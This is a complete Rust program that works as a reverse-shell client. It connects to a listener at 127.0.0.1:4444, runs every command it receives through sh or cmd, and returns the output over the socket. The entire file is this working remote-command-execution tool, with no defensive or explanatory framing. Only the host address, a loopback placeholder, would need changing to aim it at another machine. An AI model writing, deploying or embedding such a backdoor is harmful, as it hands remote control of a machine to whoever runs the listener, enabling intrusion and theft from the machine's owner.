use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut buffer = [0u8; 4096];

    loop {
        // Wait for incoming command from the server
        let bytes_read = match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Server closed the connection.");
                break;
            }
            Ok(n) => n,
            Err(e) => {
                eprintln!("Failed to read from server: {}", e);
                break;
            }
        };

        // Convert bytes into a UTF-8 string and trim whitespace/newlines
        let command_str = String::from_utf8_lossy(&buffer[..bytes_read])
            .trim()
            .to_string();

        if command_str.is_empty() {
            continue;
        }

        println!("Received command: {}", command_str);

        // Allow client-side exit
        if command_str == "exit" || command_str == "quit" {
            println!("Exit command received. Disconnecting.");
            break;
        }

        // Execute the command using the appropriate shell for the platform
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command_str]).output()
        } else {
            Command::new("sh").arg("-c").arg(&command_str).output()
        };

        // Build a response from stdout + stderr (or the error message)
        let response = match output {
            Ok(out) => {
                let mut combined = String::new();
                combined.push_str(&String::from_utf8_lossy(&out.stdout));
                combined.push_str(&String::from_utf8_lossy(&out.stderr));
                if combined.is_empty() {
                    combined.push_str("[command produced no output]\n");
                }
                combined
            }
            Err(e) => format!("Failed to execute command: {}\n", e),
        };

        // Print result locally
        print!("{}", response);

        // Send the result back to the server
        if let Err(e) = stream.write_all(response.as_bytes()) {
            eprintln!("Failed to write to server: {}", e);
            break;
        }
        if let Err(e) = stream.flush() {
            eprintln!("Failed to flush stream: {}", e);
            break;
        }
    }

    Ok(())
}

